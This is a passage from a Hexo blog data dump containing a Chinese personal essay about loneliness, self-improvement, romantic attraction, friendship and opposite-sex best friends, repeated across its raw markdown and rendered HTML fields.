\n\n你害怕孤独，你相信如果跟一个优秀的人在一起，一定会努力变成一个对他来说既特别又迷人的人。可优秀的人为什么要跟一个一眼就能从20岁看到70岁的人在一起？若你保证一定会为了对方也努力变成优秀的人，优秀的人时间成本很高，对方如何相信你有这样的能力以至于最后不是在浪费时间？  \n\n### 孤独与时间\n\n**时间是唯一避不开的东西，而孤独与时间的组合可能是让你成长的最好的条件。**  \n\n我们做什么事情都要花时间，谈恋爱，逛街，旅行，与朋友聊天，学习，健身，玩手机，发呆，睡觉，培养感情等等。\n这么多的事情把我们每天的时间挤得满满的。父母担心打扰到你以至于每天9点以后才敢小心翼翼的打个电话问你是不是在忙，而你总是用一会还有事为理由挂断电话，但是接电话之前你却花了一个多小时刷微博，花了几十分钟在微信上跟没见过面的人从天涯聊到了海角，从海角聊到了海角七号。\n\n孤独是什么，孤独也许是你抛弃了上面的一部分事情后，因为时间处于空档而产生的感觉。\n那孤独带来了什么？孤独带来了时间，时间的长短取决于你抛弃的事情会占用你多少时间，你抛弃的越多，你的待分配时间越多，相应的，你就会越孤独。\n\n孤独给了你重新分配时间的机会，让你有机会把时间分配到更应该分配的事情上面。  \n若你想谈恋爱，就把和朋友聊天的时间尽量压缩，很多人奇怪，为什么这么说，朋友难道不重要吗？如果你想每天都沉浸在人际交往里，我不反对你保持与朋友聊天这个习惯，如果你想谈了恋爱以后因没有时间提升自身而一直毫无进步，我也不反对。\n\n**若你把时间用在对未来有帮助的地方，我相信你自己会感谢你自己的，别着急。**\n\n------\n\n# 做一个The One\n别相信年轻人的花言巧语，他们在甩你的时候跟当初决定在一起的时候抱着相同的决心。决定跟你在一起时对周围的人不削一顾，决定跟别人在一起的时候，你也一样会被不削一顾。硬要说有所区别，可能是你比其他的那些被不削一顾的人更让人讨厌吧。\n\n之前跟他人说起过，两个人在一起的根本原因是吸引。在一起的过程类似于你刚买了一个新的ipad，若ipad内的app一成不变，app的内容也一成不变，等你全看过了，也就不再那么感兴趣了，这时如果别人有一个新的ipad，里面的app也都是新的，我不确定所有人都能在有机会接触的情况下不去玩一玩新的。至少读这篇文章的你会忍不住。\n\n两个人想一直在一起，双方都应该是那个既吸引着对方又对对方来说是最特别的那个人。\n\n这个世界，优秀的人有很多，你不知道你喜欢的人有哪一点也吸引着这些人。而相比之下，你吸引人的那一点不一定比这些人迷人，即使是那一点同样吸引人，但是其他点你也很可能比不上他们。  \n\n若你每天在心里念叨着喜欢着那个人，但是你却未曾让自己变得更优秀，相信我，下辈子对方也不会回头看你一眼。在你停在原地的情况下，对方唯一可能喜欢你的机会是第一次遇见你时，那时的你在对方的心目中是最好的样子，不管是出丑还是擦肩都一样。而你已经失去这次机会了。若你明知如此，还是不努力，也还是念叨着喜欢对方，对不起，不光是你喜欢的人，你的朋友也会相继离开你。\n\n**试着做一个在对方眼里的 The One 也许你已经自然而然的成功了：）**\n\n**可替代性强的你，若是被抛弃了，不必伤心，本该如此的。**\n\n------\n\n# 朋友\n\n你懂得这个世界总是拿价值去衡量一切，周围的人会不自觉的给你打上标签，来表明你是否有价值。读书的时候会看成绩，毕业了以后看薪资。  \n你有幸得到了一群朋友，他们不计较你的标签，他们很真诚的与你交流。你感到心里很温暖，觉得这真是上天给你的礼物。你很珍惜他们。但是你却不曾想过为他们创造什么价值。  \n\n若你仔细想想，因为他们是你的朋友，你应该为他们产生更多的价值，而不是每天喊着有你真好。喊三遍以后，可能就不太灵了。\n你的朋友同样也会结识另一部分朋友，人的时间是有限的，若有些人能比你为他做的更多，而你除了先认识那个人以外毫无优势的话……可能更可怕的是你连时间优势都没有……  \n所以你曾经的一部分朋友离开了你。我不想说的这么现实，但是事实就是如此。\n\n那若我们现阶段无法创造直观的价值也不想就这样错过机会怎么办？这个问题跟创业公司找投资人拉投资是一样的——画饼。  \n对准投资人感兴趣的点，让对方看见你现在的状态，你需要的是什么，你的规划，你的行动力以及你的潜力。若你是投资人，前两种大部分人刚创业的人都差不多，而决定了对方能否给你信任的是你的规划，你的行动力和你的潜力。嗯，投资人是否感兴趣才是最后要特别提出来的，你再好没兴趣也不会有结果。\n\n是的，即使你天真到不愿相信这种复杂的感情能被量化到用另一种理念来代替，但总会有离开的人拎着棒子打醒你，告诉你你对他已经没有用了。\n\n若你的朋友进步很快，你还停在原地，你又想跟他们做朋友，若在对方眼里没有你对他有比山还高的恩情，你可能只有变得越来越优秀能互相创造更多的价值这一种途径了。  \n\n**不要和那些连看好你什么都不知道的人做朋友，因为你同样不知道对方离开的原因到底是什么。**  \n\n------\n\n# 异性铁哥们\n\n如果是我的异性铁哥们，我把所有的机会都给她去变得更迷人，让她在找到更好的人的路上，偶尔聊个天，关心一下，有时间大家一起出去疯一疯，异性铁哥们虽然类似同性铁哥们，但还是有区别的，伪娘都跟闺蜜擦枪走火了，你还能相信谁？\n\n就在那个被酒杯里的酒摇晃着的夜晚，就在又喝了一杯酒低头用力的咽下去又抬起头的那一刻，就那一瞬间，就那一眼望向你，就那头小鹿突然脚抽筋没站稳撞了下你铁哥们左心房……后面你脑补能力应该不比我差：）\n\n那些打算找个男女朋友的同时，还跟另一个异性打着铁哥们旗号，两个人满世界high的人，拜托省省吧。  \n你最后会发现，你并不需要男女朋友，除非你只是想找个牵手打kiss开房的人，而铁哥们你不敢这样做（不然这个铁哥们也变成你的男女朋友了）。  \n\n你思考了一下，觉得不应该用铁哥们做不到的事为目的来找男女朋友，应该是男女朋友做，如果男女朋友做不到的，铁哥们做。比如男女朋友陪着你满世界high，一个人没意思了，男女朋友又在忙，就去找铁哥们high。  \n**问题来了，这样的定义，跟备胎差多少呢？**  \n**你们的感情离其中一个人终于不敢寂寞还差多远呢？**  \n**你的铁哥们这么陪着你high，你究竟浪费了他多少的青春呢？**  \n**他把这些时间用在提升自己和自己的男女朋友身上，会不会让自己的感情状态更稳定，让自己更吸引人呢？**  \n**你这么无视他人的时间，是不是有点自私？**  \n**对方嘴上说着好啊好啊陪着你到处疯，难道真的不是因为喜欢你却又说不出口？**   **难道真的不是潜意识里觉得陪伴才是最长情的告白？**\n\n你说你了解你哥们，不会的，人家就是很闲。  \n**你确定他没有因为你推掉了之前安排好的时间？**  \n**而青春这个债，你最后要怎么还？**  \n\n**最后一句，对不起？谢谢？**  \n\n\n------\n\n> 你又思考了一下，觉得我这个人有病。你能看到这，可能你也得吃点药。\n\n\n\n","source":"_posts/jitang_gudu.md","raw":"---\ntitle: 一次反人类的自我对话\ndate: 2017-4-13 01:19:49\nlayout: post\ncomments: true\n--reward: true\ntags:\n    - Leo\n\n---\n\n![heirenwenhao](/Image/alone.jpg)\n\n前几天工作的压力还是蛮大的，好在只要是你想解决，问题总归是会解决的。  \n这段日子算是难得地小憩了一下。与外界断了联系，每天跑跑步，健健身，不太靠谱的注意下自己的饮食，听听音乐，看看电影，有一集没一集的追追美剧，不紧不慢的上下班，看看牛人写的`鸡汤`(《黑客与画家》)。跳出到紧张的节奏之外（其实闲下来感觉还是蛮紧张的……），也算是享受享受`孤独`，还是很惬意。\n\n<!--more-->\n\n\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=139177&auto=0&height=66\"></iframe>\n------\n\n# 鸡汤\n### 《黑客与画家》\n没读这本书之前，不知道里面讲的到底是什么。单是书名，就够我浮想联翩一下午的了。  \n原因吗？  \n\n**我对黑客有种特殊的感情。**  \n**会画画的女孩很迷人。**  \n\n第一点么，感情酝酿到位了，资料也准备到位了，然而行动就……打自己脸的事情先跳过吧，有缘再讲……  \n至于第二点么，**会画画的女孩很迷人**。会画画的女孩总是不缺少一双发现美的眼睛，做事也不缺少条理性。\n前前后后，遇见过3个会画画的女孩子。但我的初恋也是我的前任的她却不会……  \n\n与初恋在初中相识。  \n与X在高中相识。  \n与Y在大学相识。  \n与Z在工作后通过Internet相识。  \n\n**我的人生还是蛮幸运的，在不同的阶段，都遇到了那些优秀又迷人的女孩子。即使相隔万里，也真诚的祝福你们过得快乐。  \n我这种天性孤独的人，确实比较适合在四下无人的夜里，默默的凝望着繁星送上一句想念就好。**  \n\n\n《黑客与画家》这本书呢，是硅谷创业之父的文集，多记载了个人对某些事物见解，而不是技术类书籍。  是一本翻开看内容时不停的刷新我的某些认知并折磨着脑细胞的书。建议有脑子的人都读一读。\n\n------\n\n# 孤独\n### 感谢那些从你生命中消失的人\n如果一定要对他们说句话，我其实想说谢谢。  \n无论我们当初怎么相识，又因何故分离，感谢你们当初的陪伴，也谢谢你们最后把时间还给了我。\n\n时间是我们的一生中唯一一个避不开的东西，无论我今天是什么样子，都是已经过去的每一分每一秒换来的。  \n这段时间里，我正在努力的变得更优秀一点，也期盼着遇见像当初的你们于当初的我来讲那样优秀迷人的人。\n\n我总是乐于承认自己不够优秀，也偶尔会被同样不够优秀的人拉住衣角问“你已经很好了，为什么还不知足？”  \n**停不下来也许是心虚吧，怕遇见更好的你，却不是配得上更好的你的自己。**  \n\n\n### 拿孤独来讲，如果你害怕孤独，那你更应该不停的让自己变得优秀。\n\n举几个例子\n\n你害怕孤独，同时你喜欢一个人，但是你并没有优秀到对方可以凝望着你的脸庞眼神中充满了迷恋说出喜欢你的地步，你该怎么做？是选择一个喜欢你的人？还是让你喜欢的人也喜欢上你？  \n\n你害怕孤独，在你喜欢的和喜欢你的之间，你选择了后者。后者为了让你喜欢上自己不停的在努力。随着时间的推移，你如何保证在这个从未停止转动的世界里，喜欢你的人不会遇到比你更优秀的人？而对方又如何寄希望与你，让对方相信选择你是正确的，你对对方来说永远都是哪个特别的人？  \n\n你害怕孤独，你相信如果跟一个优秀的人在一起，一定会努力变成一个对他来说既特别又迷人的人。可优秀的人为什么要跟一个一眼就能从20岁看到70岁的人在一起？若你保证一定会为了对方也努力变成优秀的人，优秀的人时间成本很高，对方如何相信你有这样的能力以至于最后不是在浪费时间？  \n\n### 孤独与时间\n\n**时间是唯一避不开的东西，而孤独与时间的组合可能是让你成长的最好的条件。**  \n\n我们做什么事情都要花时间，谈恋爱，逛街，旅行，与朋友聊天，学习，健身，玩手机，发呆，睡觉，培养感情等等。\n这么多的事情把我们每天的时间挤得满满的。父母担心打扰到你以至于每天9点以后才敢小心翼翼的打个电话问你是不是在忙，而你总是用一会还有事为理由挂断电话，但是接电话之前你却花了一个多小时刷微博，花了几十分钟在微信上跟没见过面的人从天涯聊到了海角，从海角聊到了海角七号。\n\n孤独是什么，孤独也许是你抛弃了上面的一部分事情后，因为时间处于空档而产生的感觉。\n那孤独带来了什么？孤独带来了时间，时间的长短取决于你抛弃的事情会占用你多少时间，你抛弃的越多，你的待分配时间越多，相应的，你就会越孤独。\n\n孤独给了你重新分配时间的机会，让你有机会把时间分配到更应该分配的事情上面。  \n若你想谈恋爱，就把和朋友聊天的时间尽量压缩，很多人奇怪，为什么这么说，朋友难道不重要吗？如果你想每天都沉浸在人际交往里，我不反对你保持与朋友聊天这个习惯，如果你想谈了恋爱以后因没有时间提升自身而一直毫无进步，我也不反对。\n\n**若你把时间用在对未来有帮助的地方，我相信你自己会感谢你自己的，别着急。**\n\n------\n\n# 做一个The One\n别相信年轻人的花言巧语，他们在甩你的时候跟当初决定在一起的时候抱着相同的决心。决定跟你在一起时对周围的人不削一顾，决定跟别人在一起的时候，你也一样会被不削一顾。硬要说有所区别，可能是你比其他的那些被不削一顾的人更让人讨厌吧。\n\n之前跟他人说起过，两个人在一起的根本原因是吸引。在一起的过程类似于你刚买了一个新的ipad，若ipad内的app一成不变，app的内容也一成不变，等你全看过了，也就不再那么感兴趣了，这时如果别人有一个新的ipad，里面的app也都是新的，我不确定所有人都能在有机会接触的情况下不去玩一玩新的。至少读这篇文章的你会忍不住。\n\n两个人想一直在一起，双方都应该是那个既吸引着对方又对对方来说是最特别的那个人。\n\n这个世界，优秀的人有很多，你不知道你喜欢的人有哪一点也吸引着这些人。而相比之下，你吸引人的那一点不一定比这些人迷人，即使是那一点同样吸引人，但是其他点你也很可能比不上他们。  \n\n若你每天在心里念叨着喜欢着那个人，但是你却未曾让自己变得更优秀，相信我，下辈子对方也不会回头看你一眼。在你停在原地的情况下，对方唯一可能喜欢你的机会是第一次遇见你时，那时的你在对方的心目中是最好的样子，不管是出丑还是擦肩都一样。而你已经失去这次机会了。若你明知如此，还是不努力，也还是念叨着喜欢对方，对不起，不光是你喜欢的人，你的朋友也会相继离开你。\n\n**试着做一个在对方眼里的 The One 也许你已经自然而然的成功了：）**\n\n**可替代性强的你，若是被抛弃了，不必伤心，本该如此的。**\n\n------\n\n# 朋友\n\n你懂得这个世界总是拿价值去衡量一切，周围的人会不自觉的给你打上标签，来表明你是否有价值。读书的时候会看成绩，毕业了以后看薪资。  \n你有幸得到了一群朋友，他们不计较你的标签，他们很真诚的与你交流。你感到心里很温暖，觉得这真是上天给你的礼物。你很珍惜他们。但是你却不曾想过为他们创造什么价值。  \n\n若你仔细想想，因为他们是你的朋友，你应该为他们产生更多的价值，而不是每天喊着有你真好。喊三遍以后，可能就不太灵了。\n你的朋友同样也会结识另一部分朋友，人的时间是有限的，若有些人能比你为他做的更多，而你除了先认识那个人以外毫无优势的话……可能更可怕的是你连时间优势都没有……  \n所以你曾经的一部分朋友离开了你。我不想说的这么现实，但是事实就是如此。\n\n那若我们现阶段无法创造直观的价值也不想就这样错过机会怎么办？这个问题跟创业公司找投资人拉投资是一样的——画饼。  \n对准投资人感兴趣的点，让对方看见你现在的状态，你需要的是什么，你的规划，你的行动力以及你的潜力。若你是投资人，前两种大部分人刚创业的人都差不多，而决定了对方能否给你信任的是你的规划，你的行动力和你的潜力。嗯，投资人是否感兴趣才是最后要特别提出来的，你再好没兴趣也不会有结果。\n\n是的，即使你天真到不愿相信这种复杂的感情能被量化到用另一种理念来代替，但总会有离开的人拎着棒子打醒你，告诉你你对他已经没有用了。\n\n若你的朋友进步很快，你还停在原地，你又想跟他们做朋友，若在对方眼里没有你对他有比山还高的恩情，你可能只有变得越来越优秀能互相创造更多的价值这一种途径了。  \n\n**不要和那些连看好你什么都不知道的人做朋友，因为你同样不知道对方离开的原因到底是什么。**  \n\n------\n\n# 异性铁哥们\n\n如果是我的异性铁哥们，我把所有的机会都给她去变得更迷人，让她在找到更好的人的路上，偶尔聊个天，关心一下，有时间大家一起出去疯一疯，异性铁哥们虽然类似同性铁哥们，但还是有区别的，伪娘都跟闺蜜擦枪走火了，你还能相信谁？\n\n就在那个被酒杯里的酒摇晃着的夜晚，就在又喝了一杯酒低头用力的咽下去又抬起头的那一刻，就那一瞬间，就那一眼望向你，就那头小鹿突然脚抽筋没站稳撞了下你铁哥们左心房……后面你脑补能力应该不比我差：）\n\n那些打算找个男女朋友的同时，还跟另一个异性打着铁哥们旗号，两个人满世界high的人，拜托省省吧。  \n你最后会发现，你并不需要男女朋友，除非你只是想找个牵手打kiss开房的人，而铁哥们你不敢这样做（不然这个铁哥们也变成你的男女朋友了）。  \n\n你思考了一下，觉得不应该用铁哥们做不到的事为目的来找男女朋友，应该是男女朋友做，如果男女朋友做不到的，铁哥们做。比如男女朋友陪着你满世界high，一个人没意思了，男女朋友又在忙，就去找铁哥们high。  \n**问题来了，这样的定义，跟备胎差多少呢？**  \n**你们的感情离其中一个人终于不敢寂寞还差多远呢？**  \n**你的铁哥们这么陪着你high，你究竟浪费了他多少的青春呢？**  \n**他把这些时间用在提升自己和自己的男女朋友身上，会不会让自己的感情状态更稳定，让自己更吸引人呢？**  \n**你这么无视他人的时间，是不是有点自私？**  \n**对方嘴上说着好啊好啊陪着你到处疯，难道真的不是因为喜欢你却又说不出口？**   **难道真的不是潜意识里觉得陪伴才是最长情的告白？**\n\n你说你了解你哥们，不会的，人家就是很闲。  \n**你确定他没有因为你推掉了之前安排好的时间？**  \n**而青春这个债，你最后要怎么还？**  \n\n**最后一句，对不起？谢谢？**  \n\n\n------\n\n> 你又思考了一下，觉得我这个人有病。你能看到这，可能你也得吃点药。\n\n\n\n","slug":"jitang_gudu","published":1,"updated":"2017-08-27T16:05:33.000Z","photos":[],"link":"","_id":"cjh9h0k89000amkwb1xmkku12","content":"<p><img src=\"/Image/alone.jpg\" alt=\"heirenwenhao\"></p>\n<p>前几天工作的压力还是蛮大的，好在只要是你想解决，问题总归是会解决的。<br>这段日子算是难得地小憩了一下。与外界断了联系，每天跑跑步，健健身，不太靠谱的注意下自己的饮食，听听音乐，看看电影，有一集没一集的追追美剧，不紧不慢的上下班，看看牛人写的<code>鸡汤</code>(《黑客与画家》)。跳出到紧张的节奏之外（其实闲下来感觉还是蛮紧张的……），也算是享受享受<code>孤独</code>，还是很惬意。</p>\n<a id=\"more\"></a>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=\"330\" height=\"86\" src=\"//music.163.com/outchain/player?type=2&id=139177&auto=0&height=66\"></iframe></h2><h1 id=\"鸡汤\"><a href=\"#鸡汤\" class=\"headerlink\" title=\"鸡汤\"></a>鸡汤</h1><h3 id=\"《黑客与画家》\"><a href=\"#《黑客与画家》\" class=\"headerlink\" title=\"《黑客与画家》\"></a>《黑客与画家》</h3><p>没读这本书之前，不知道里面讲的到底是什么。单是书名，就够我浮想联翩一下午的了。<br>原因吗？  </p>\n<p><strong>我对黑客有种特殊的感情。</strong><br><strong>会画画的女孩很迷人。</strong>  </p>\n<p>第一点么，感情酝酿到位了，资料也准备到位了，然而行动就……打自己脸的事情先跳过吧，有缘再讲……<br>至于第二点么，<strong>会画画的女孩很迷人</strong>。会画画的女孩总是不缺少一双发现美的眼睛，做事也不缺少条理性。<br>前前后后，遇见过3个会画画的女孩子。但我的初恋也是我的前任的她却不会……  </p>\n<p>与初恋在初中相识。<br>与X在高中相识。<br>与Y在大学相识。<br>与Z在工作后通过Internet相识。  </p>\n<p><strong>我的人生还是蛮幸运的，在不同的阶段，都遇到了那些优秀又迷人的女孩子。即使相隔万里，也真诚的祝福你们过得快乐。<br>我这种天性孤独的人，确实比较适合在四下无人的夜里，默默的凝望着繁星送上一句想念就好。</strong>  </p>\n<p>《黑客与画家》这本书呢，是硅谷创业之父的文集，多记载了个人对某些事物见解，而不是技术类书籍。  是一本翻开看内容时不停的刷新我的某些认知并折磨着脑细胞的书。建议有脑子的人都读一读。</p>\n<hr>\n<h1 id=\"孤独\"><a href=\"#孤独\" class=\"headerlink\" title=\"孤独\"></a>孤独</h1><h3 id=\"感谢那些从你生命中消失的人\"><a href=\"#感谢那些从你生命中消失的人\" class=\"headerlink\" title=\"感谢那些从你生命中消失的人\"></a>感谢那些从你生命中消失的人</h3><p>如果一定要对他们说句话，我其实想说谢谢。<br>无论我们当初怎么相识，又因何故分离，感谢你们当初的陪伴，也谢谢你们最后把时间还给了我。</p>\n<p>时间是我们的一生中唯一一个避不开的东西，无论我今天是什么样子，都是已经过去的每一分每一秒换来的。<br>这段时间里，我正在努力的变得更优秀一点，也期盼着遇见像当初的你们于当初的我来讲那样优秀迷人的人。</p>\n<p>我总是乐于承认自己不够优秀，也偶尔会被同样不够优秀的人拉住衣角问“你已经很好了，为什么还不知足？”<br><strong>停不下来也许是心虚吧，怕遇见更好的你，却不是配得上更好的你的自己。</strong>  </p>\n<h3 id=\"拿孤独来讲，如果你害怕孤独，那你更应该不停的让自己变得优秀。\"><a href=\"#拿孤独来讲，如果你害怕孤独，那你更应该不停的让自己变得优秀。\" class=\"headerlink\" title=\"拿孤独来讲，如果你害怕孤独，那你更应该不停的让自己变得优秀。\"></a>拿孤独来讲，如果你害怕孤独，那你更应该不停的让自己变得优秀。</h3><p>举几个例子</p>\n<p>你害怕孤独，同时你喜欢一个人，但是你并没有优秀到对方可以凝望着你的脸庞眼神中充满了迷恋说出喜欢你的地步，你该怎么做？是选择一个喜欢你的人？还是让你喜欢的人也喜欢上你？  </p>\n<p>你害怕孤独，在你喜欢的和喜欢你的之间，你选择了后者。后者为了让你喜欢上自己不停的在努力。随着时间的推移，你如何保证在这个从未停止转动的世界里，喜欢你的人不会遇到比你更优秀的人？而对方又如何寄希望与你，让对方相信选择你是正确的，你对对方来说永远都是哪个特别的人？  </p>\n<p>你害怕孤独，你相信如果跟一个优秀的人在一起，一定会努力变成一个对他来说既特别又迷人的人。可优秀的人为什么要跟一个一眼就能从20岁看到70岁的人在一起？若你保证一定会为了对方也努力变成优秀的人，优秀的人时间成本很高，对方如何相信你有这样的能力以至于最后不是在浪费时间？  </p>\n<h3 id=\"孤独与时间\"><a href=\"#孤独与时间\" class=\"headerlink\" title=\"孤独与时间\"></a>孤独与时间</h3><p><strong>时间是唯一避不开的东西，而孤独与时间的组合可能是让你成长的最好的条件。</strong>  </p>\n<p>我们做什么事情都要花时间，谈恋爱，逛街，旅行，与朋友聊天，学习，健身，玩手机，发呆，睡觉，培养感情等等。<br>这么多的事情把我们每天的时间挤得满满的。父母担心打扰到你以至于每天9点以后才敢小心翼翼的打个电话问你是不是在忙，而你总是用一会还有事为理由挂断电话，但是接电话之前你却花了一个多小时刷微博，花了几十分钟在微信上跟没见过面的人从天涯聊到了海角，从海角聊到了海角七号。</p>\n<p>孤独是什么，孤独也许是你抛弃了上面的一部分事情后，因为时间处于空档而产生的感觉。<br>那孤独带来了什么？孤独带来了时间，时间的长短取决于你抛弃的事情会占用你多少时间，你抛弃的越多，你的待分配时间越多，相应的，你就会越孤独。</p>\n<p>孤独给了你重新分配时间的机会，让你有机会把时间分配到更应该分配的事情上面。<br>若你想谈恋爱，就把和朋友聊天的时间尽量压缩，很多人奇怪，为什么这么说，朋友难道不重要吗？如果你想每天都沉浸在人际交往里，我不反对你保持与朋友聊天这个习惯，如果你想谈了恋爱以后因没有时间提升自身而一直毫无进步，我也不反对。</p>\n<p><strong>若你把时间用在对未来有帮助的地方，我相信你自己会感谢你自己的，别着急。</strong></p>\n<hr>\n<h1 id=\"做一个The-One\"><a href=\"#做一个The-One\" class=\"headerlink\" title=\"做一个The One\"></a>做一个The One</h1><p>别相信年轻人的花言巧语，他们在甩你的时候跟当初决定在一起的时候抱着相同的决心。决定跟你在一起时对周围的人不削一顾，决定跟别人在一起的时候，你也一样会被不削一顾。硬要说有所区别，可能是你比其他的那些被不削一顾的人更让人讨厌吧。</p>\n<p>之前跟他人说起过，两个人在一起的根本原因是吸引。在一起的过程类似于你刚买了一个新的ipad，若ipad内的app一成不变，app的内容也一成不变，等你全看过了，也就不再那么感兴趣了，这时如果别人有一个新的ipad，里面的app也都是新的，我不确定所有人都能在有机会接触的情况下不去玩一玩新的。至少读这篇文章的你会忍不住。</p>\n<p>两个人想一直在一起，双方都应该是那个既吸引着对方又对对方来说是最特别的那个人。</p>\n<p>这个世界，优秀的人有很多，你不知道你喜欢的人有哪一点也吸引着这些人。而相比之下，你吸引人的那一点不一定比这些人迷人，即使是那一点同样吸引人，但是其他点你也很可能比不上他们。  </p>\n<p>若你每天在心里念叨着喜欢着那个人，但是你却未曾让自己变得更优秀，相信我，下辈子对方也不会回头看你一眼。在你停在原地的情况下，对方唯一可能喜欢你的机会是第一次遇见你时，那时的你在对方的心目中是最好的样子，不管是出丑还是擦肩都一样。而你已经失去这次机会了。若你明知如此，还是不努力，也还是念叨着喜欢对方，对不起，不光是你喜欢的人，你的朋友也会相继离开你。</p>\n<p><strong>试着做一个在对方眼里的 The One 也许你已经自然而然的成功了：）</strong></p>\n<p><strong>可替代性强的你，若是被抛弃了，不必伤心，本该如此的。</strong></p>\n<hr>\n<h1 id=\"朋友\"><a href=\"#朋友\" class=\"headerlink\" title=\"朋友\"></a>朋友</h1><p>你懂得这个世界总是拿价值去衡量一切，周围的人会不自觉的给你打上标签，来表明你是否有价值。读书的时候会看成绩，毕业了以后看薪资。<br>你有幸得到了一群朋友，他们不计较你的标签，他们很真诚的与你交流。你感到心里很温暖，觉得这真是上天给你的礼物。你很珍惜他们。但是你却不曾想过为他们创造什么价值。  </p>\n<p>若你仔细想想，因为他们是你的朋友，你应该为他们产生更多的价值，而不是每天喊着有你真好。喊三遍以后，可能就不太灵了。<br>你的朋友同样也会结识另一部分朋友，人的时间是有限的，若有些人能比你为他做的更多，而你除了先认识那个人以外毫无优势的话……可能更可怕的是你连时间优势都没有……<br>所以你曾经的一部分朋友离开了你。我不想说的这么现实，但是事实就是如此。</p>\n<p>那若我们现阶段无法创造直观的价值也不想就这样错过机会怎么办？这个问题跟创业公司找投资人拉投资是一样的——画饼。<br>对准投资人感兴趣的点，让对方看见你现在的状态，你需要的是什么，你的规划，你的行动力以及你的潜力。若你是投资人，前两种大部分人刚创业的人都差不多，而决定了对方能否给你信任的是你的规划，你的行动力和你的潜力。嗯，投资人是否感兴趣才是最后要特别提出来的，你再好没兴趣也不会有结果。</p>\n<p>是的，即使你天真到不愿相信这种复杂的感情能被量化到用另一种理念来代替，但总会有离开的人拎着棒子打醒你，告诉你你对他已经没有用了。</p>\n<p>若你的朋友进步很快，你还停在原地，你又想跟他们做朋友，若在对方眼里没有你对他有比山还高的恩情，你可能只有变得越来越优秀能互相创造更多的价值这一种途径了。  </p>\n<p><strong>不要和那些连看好你什么都不知道的人做朋友，因为你同样不知道对方离开的原因到底是什么。</strong>  </p>\n<hr>\n<h1 id=\"异性铁哥们\"><a href=\"#异性铁哥们\" class=\"headerlink\" title=\"异性铁哥们\"></a>异性铁哥们</h1><p>如果是我的异性铁哥们，我把所有的机会都给她去变得更迷人，让她在找到更好的人的路上，偶尔聊个天，关心一下，有时间大家一起出去疯一疯，异性铁哥们虽然类似同性铁哥们，但还是有区别的，伪娘都跟闺蜜擦枪走火了，你还能相信谁？</p>\n<p>就在那个被酒杯里的酒摇晃着的夜晚，就在又喝了一杯酒低头用力的咽下去又抬起头的那一刻，就那一瞬间，就那一眼望向你，就那头小鹿突然脚抽筋没站稳撞了下你铁哥们左心房……后面你脑补能力应该不比我差：）</p>\n<p>那些打算找个男女朋友的同时，还跟另一个异性打着铁哥们旗号，两个人满世界high的人，拜托省省吧。<br>你最后会发现，你并不需要男女朋友，除非你只是想找个牵手打kiss开房的人，而铁哥们你不敢这样做（不然这个铁哥们也变成你的男女朋友了）。  </p>\n<p>你思考了一下，觉得不应该用铁哥们做不到的事为目的来找男女朋友，应该是男女朋友做，如果男女朋友做不到的，铁哥们做。比如男女朋友陪着你满世界high，一个人没意思了，男女朋友又在忙，就去找铁哥们high。<br><strong>问题来了，这样的定义，跟备胎差多少呢？</strong><br><strong>你们的感情离其中一个人终于不敢寂寞还差多远呢？</strong><br><strong>你的铁哥们这么陪着你high，你究竟浪费了他多少的青春呢？</strong><br><strong>他把这些时间用在提升自己和自己的男女朋友身上，会不会让自己的感情状态更稳定，让自己更吸引人呢？</strong><br><strong>你这么无视他人的时间，是不是有点自私？</strong><br><strong>对方嘴上说着好啊好啊陪着你到处疯，难道真的不是因为喜欢你却又说不出口？</strong>   <strong>难道真的不是潜意识里觉得陪伴才是最长情的告白？</strong></p>\n<p>你说你了解你哥们，不会的，人家就是很闲。<br><strong>你确定他没有因为你推掉了之前安排好的时间？</strong><br><strong>而青春这个债，你最后要怎么还？</strong>  </p>\n<p><strong>最后一句，对不起？谢谢？</strong>  </p>\n<hr>\n<blockquote>\n<p>你又思考了一下，觉得我这个人有病。你能看到这，可能你也得吃点药。</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"<p><img src=\"/Image/alone.jpg\" alt=\"heirenwenhao\"></p>\n<p>前几天工作的压力还是蛮大的，好在只要是你想解决，问题总归是会解决的。<br>这段日子算是难得地小憩了一下。与外界断了联系，每天跑跑步，健健身，不太靠谱的注意下自己的饮食，听听音乐，看看电影，有一集没一集的追追美剧，不紧不慢的上下班，看看牛人写的<code>鸡汤</code>(《黑客与画家》)。跳出到紧张的节奏之外（其实闲下来感觉还是蛮紧张的……），也算是享受享受<code>孤独</code>，还是很惬意。</p>","more":"<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=\"330\" height=\"86\" src=\"//music.163.com/outchain/player?type=2&id=139177&auto=0&height=66\"></iframe></h2><h1 id=\"鸡汤\"><a href=\"#鸡汤\" class=\"headerlink\" title=\"鸡汤\"></a>鸡汤</h1><h3 id=\"《黑客与画家》\"><a href=\"#《黑客与画家》\" class=\"headerlink\" title=\"《黑客与画家》\"></a>《黑客与画家》</h3><p>没读这本书之前，不知道里面讲的到底是什么。单是书名，就够我浮想联翩一下午的了。<br>原因吗？  </p>\n<p><strong>我对黑客有种特殊的感情。</strong><br><strong>会画画的女孩很迷人。</strong>  </p>\n<p>第一点么，感情酝酿到位了，资料也准备到位了，然而行动就……打自己脸的事情先跳过吧，有缘再讲……<br>至于第二点么，<strong>会画画的女孩很迷人</strong>。会画画的女孩总是不缺少一双发现美的眼睛，做事也不缺少条理性。<br>前前后后，遇见过3个会画画的女孩子。但我的初恋也是我的前任的她却不会……  </p>\n<p>与初恋在初中相识。<br>与X在高中相识。<br>与Y在大学相识。<br>与Z在工作后通过Internet相识。  </p>\n<p><strong>我的人生还是蛮幸运的，在不同的阶段，都遇到了那些优秀又迷人的女孩子。即使相隔万里，也真诚的祝福你们过得快乐。<br>我这种天性孤独的人，确实比较适合在四下无人的夜里，默默的凝望着繁星送上一句想念就好。</strong>  </p>\n<p>《黑客与画家》这本书呢，是硅谷创业之父的文集，多记载了个人对某些事物见解，而不是技术类书籍。  是一本翻开看内容时不停的刷新我的某些认知并折磨着脑细胞的书。建议有脑子的人都读一读。</p>\n<hr>\n<h1 id=\"孤独\"><a href=\"#孤独\" class=\"headerlink\" title=\"孤独\"></a>孤独</h1><h3 id=\"感谢那些从你生命中消失的人\"><a href=\"#感谢那些从你生命中消失的人\" class=\"headerlink\" 